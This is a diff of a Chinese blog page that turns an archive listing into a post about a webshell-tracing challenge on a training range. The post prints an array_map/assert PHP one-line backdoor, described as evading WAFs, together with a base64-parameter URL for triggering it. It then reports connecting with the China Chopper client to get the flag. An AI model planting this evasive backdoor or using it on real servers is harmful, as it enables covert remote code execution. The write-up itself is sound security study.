@@ -3,19 +3,29 @@
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
-  <title>Archives: 2019/3 | 37° &#39;s blog</title>
+  <title>墨者WebShell代码分析溯源(第6题) | 37° &#39;s blog</title>
 
   <!-- keywords -->
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="37° &#39;s blog">
-<meta property="og:url" content="http://yoursite.com/archives/2019/03/index.html">
+  <meta name="description" content="前言过狗过盾无特征无动态函数PHP一句话 原理：https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html 正文代码审计进入漏洞之后，发现一个下载系统源码，下载之后发现在www_bak\Assets\upload\目录有一个pic3.jpg.php，很明显是黑客上传上去生成一句话木马的文件，打开之后如下图所示：  array_">
+<meta name="keywords" content="漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="墨者WebShell代码分析溯源(第6题)">
+<meta property="og:url" content="http://yoursite.com/2019/04/03/墨者WebShell代码分析溯源(第6题)/index.html">
 <meta property="og:site_name" content="37° &#39;s blog">
+<meta property="og:description" content="前言过狗过盾无特征无动态函数PHP一句话 原理：https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html 正文代码审计进入漏洞之后，发现一个下载系统源码，下载之后发现在www_bak\Assets\upload\目录有一个pic3.jpg.php，很明显是黑客上传上去生成一句话木马的文件，打开之后如下图所示：  array_">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i.loli.net/2019/04/03/5ca44da94909b.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/03/5ca47743b44a4.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/03/5ca477969aa2e.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/03/5ca477c7471d4.jpg">
+<meta property="og:updated_time" content="2019-04-03T09:08:00.577Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="37° &#39;s blog">
+<meta name="twitter:title" content="墨者WebShell代码分析溯源(第6题)">
+<meta name="twitter:description" content="前言过狗过盾无特征无动态函数PHP一句话 原理：https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html 正文代码审计进入漏洞之后，发现一个下载系统源码，下载之后发现在www_bak\Assets\upload\目录有一个pic3.jpg.php，很明显是黑客上传上去生成一句话木马的文件，打开之后如下图所示：  array_">
+<meta name="twitter:image" content="https://i.loli.net/2019/04/03/5ca44da94909b.jpg">
   
     <link rel="alternative" href="/atom.xml" title="37° &#39;s blog" type="application/atom+xml">
   
@@ -209,270 +219,102 @@
 		</header>				
 	</div>
 </nav>
-      <div class="body-wrap">
+      <div class="body-wrap"><article id="post-墨者WebShell代码分析溯源(第6题)" class="article article-type-post" itemscope="" itemprop="blogPost">
   
-  
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/28/DVWA漏洞靶机环境搭建/" class="archive-article-date">
-  	<time datetime="2019-03-28T12:56:02.000Z" itemprop="datePublished">3月 28</time>
+    <div class="article-meta">
+      <a href="/2019/04/03/墨者WebShell代码分析溯源(第6题)/" class="article-date">
+  	<time datetime="2019-04-03T05:59:10.000Z" itemprop="datePublished">2019-04-03</time>
 </a>
-        </div>
-    	 
+    </div>
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/28/DVWA漏洞靶机环境搭建/">
-        DVWA漏洞靶机环境搭建
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
         
-      </a>
+  
+    <h1 class="article-title" itemprop="name">
+      墨者WebShell代码分析溯源(第6题)
+      
     </h1>
   
 
-        <div class="article-info info-on-left">
-          
+      </header>
+      
+      <div class="article-info article-info-post">
+        
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
 	</div>
 
-          
-
-          
-            
-<div class="counter-tag counter">
-    <span id="/2019/03/28/DVWA漏洞靶机环境搭建/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="DVWA漏洞靶机环境搭建">
-         &nbsp;
-        view
-    </span>
-</div>
-
-          
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/27/pycham搭建python程序运行环境/" class="archive-article-date">
-  	<time datetime="2019-03-27T11:03:23.000Z" itemprop="datePublished">3月 27</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/27/pycham搭建python程序运行环境/">
-        pycharm搭建python程序运行环境
         
-      </a>
-    </h1>
-  
 
-        <div class="article-info info-on-left">
-          
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python环境搭建/">python环境搭建</a></li></ul>
-	</div>
-
-          
-
-          
-            
-<div class="counter-tag counter">
-    <span id="/2019/03/27/pycham搭建python程序运行环境/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="pycharm搭建python程序运行环境">
-         &nbsp;
-        view
-    </span>
-</div>
-
-          
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/27/cve漏洞复现/" class="archive-article-date">
-  	<time datetime="2019-03-27T02:18:10.000Z" itemprop="datePublished">3月 27</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/27/cve漏洞复现/">
-        CVE-2018-12613漏洞复现
         
-      </a>
-    </h1>
-  
-
-        <div class="article-info info-on-left">
           
-          
-
-          
-            
 <div class="counter-tag counter">
-    <span id="/2019/03/27/cve漏洞复现/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="CVE-2018-12613漏洞复现">
+    <span id="/2019/04/03/墨者WebShell代码分析溯源(第6题)/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="墨者WebShell代码分析溯源(第6题)">
          &nbsp;
         view
     </span>
 </div>
 
-          
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/26/python字典，数组推导式/" class="archive-article-date">
-  	<time datetime="2019-03-26T02:19:53.000Z" itemprop="datePublished">3月 26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/26/python字典，数组推导式/">
-        python的列表推导式，字典推导式和三元运算符
         
-      </a>
-    </h1>
-  
-
-        <div class="article-info info-on-left">
-          
-          
-
-          
-            
-<div class="counter-tag counter">
-    <span id="/2019/03/26/python字典，数组推导式/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="python的列表推导式，字典推导式和三元运算符">
-         &nbsp;
-        view
-    </span>
-</div>
-
-          
-        </div>
         <div class="clearfix"></div>
-    </header>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>过狗过盾无特征无动态函数PHP一句话</p>
+<p>原理：<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>进入漏洞之后，发现一个<strong>下载系统源码</strong>，下载之后发现在<strong>www_bak\Assets\upload\</strong>目录有一个<strong>pic3.jpg.php</strong>，很明显是黑客上传上去生成一句话木马的文件，打开之后如下图所示：<br><img src="https://i.loli.net/2019/04/03/5ca44da94909b.jpg" alt=""></p>
+<blockquote>
+<p>array_map函数： 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。</p>
+</blockquote>
+<p>分析上述代码，可以发现黑客上传的密码<strong>POST</strong>，并发现array_map回调函数，这段代码就相当于base64_decode($_REQUEST[‘e’])($_POST[‘POST’])，array_map的第一个参数需要是回调函数，所以这个后门：<br><strong>array_map(assert,(array)base64_decode($_REQUEST[‘POST’]));</strong>array_map第二个参数需要再镶嵌一个assert。</p>
+<h2 id="构造url"><a href="#构造url" class="headerlink" title="构造url"></a>构造url</h2><p>构造url就比较简单了，直接<strong>ip+上传目录+参数</strong>，构造好后就是：<br><a href="http://219.153.49.228:48515/www/Assets/upload/pic3.jpg.php?e=YXNzZXJ0" target="_blank" rel="noopener">http://219.153.49.228:48515/www/Assets/upload/pic3.jpg.php?e=YXNzZXJ0</a></p>
+<h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h2><p>构造完成url，直接菜刀连接，如下图：<br><img src="https://i.loli.net/2019/04/03/5ca47743b44a4.jpg" alt=""><br>成功连接，找到key<br><img src="https://i.loli.net/2019/04/03/5ca477969aa2e.jpg" alt=""><br><img src="https://i.loli.net/2019/04/03/5ca477c7471d4.jpg" alt=""></p>
+<h1 id="END！"><a href="#END！" class="headerlink" title="END！"></a>END！</h1>
+      
+    </div>
+    
   </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/04/02/DVWA（文件上传篇）/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">DVWA（文件上传篇）</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/25/strip用法/" class="archive-article-date">
-  	<time datetime="2019-03-25T05:58:31.000Z" itemprop="datePublished">3月 25</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/25/strip用法/">
-        Python中strip()、lstrip()、rstrip()用法
-        
-      </a>
-    </h1>
-  
 
-        <div class="article-info info-on-left">
-          
-          
 
-          
-            
-<div class="counter-tag counter">
-    <span id="/2019/03/25/strip用法/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="Python中strip()、lstrip()、rstrip()用法">
-         &nbsp;
-        view
-    </span>
-</div>
+<div class="ds-share share" data-thread-key="墨者WebShell代码分析溯源(第6题)" data-title="墨者WebShell代码分析溯源(第6题)" data-url="http://yoursite.com/2019/04/03/墨者WebShell代码分析溯源(第6题)/" data-images="https://i.loli.net/2019/01/18/5c41d6b1f13df.jpg" data-content="墨者WebShell代码分析溯源(第6题)">
+    <div class="ds-share-inline">
+      <ul class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
 
-          
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/23/win7系统安装/" class="archive-article-date">
-  	<time datetime="2019-03-23T02:39:25.000Z" itemprop="datePublished">3月 23</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/23/win7系统安装/">
-        windows操作系统的安装
-        
-      </a>
-    </h1>
-  
 
-        <div class="article-info info-on-left">
-          
-          
 
-          
-            
-<div class="counter-tag counter">
-    <span id="/2019/03/23/win7系统安装/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="windows操作系统的安装">
-         &nbsp;
-        view
-    </span>
-</div>
 
-          
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 </div>
       <footer id="footer">
@@ -498,8 +340,8 @@
 		mathjax: true,
 		animate: true,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true
